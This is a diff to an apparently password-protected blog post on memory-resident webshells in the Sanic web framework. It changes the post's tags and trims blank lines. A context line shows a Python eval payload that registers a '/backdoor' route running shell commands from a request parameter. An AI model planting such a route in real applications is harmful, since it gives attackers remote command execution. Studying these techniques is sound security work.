@@ -7,7 +7,7 @@ lastmod: "2025-05-27T15:35:40"
 image: ""
 license: ""
 categories: ["talk"]
-tags: ["sanic"]
+tags: ["内存马", "Sanic"]
 
 password: "sanicccccccccc"
 
@@ -198,6 +198,4 @@ for i, shell_class in enumerate([Shell1, Shell2, Shell3, Shell4, Shell5], 1):
 ```python
 return (eval, ("""app.route('/backdoor')(lambda r: __import__('os').popen(r.args['cmd'][0]).read())""",))
 ```
-
-
 
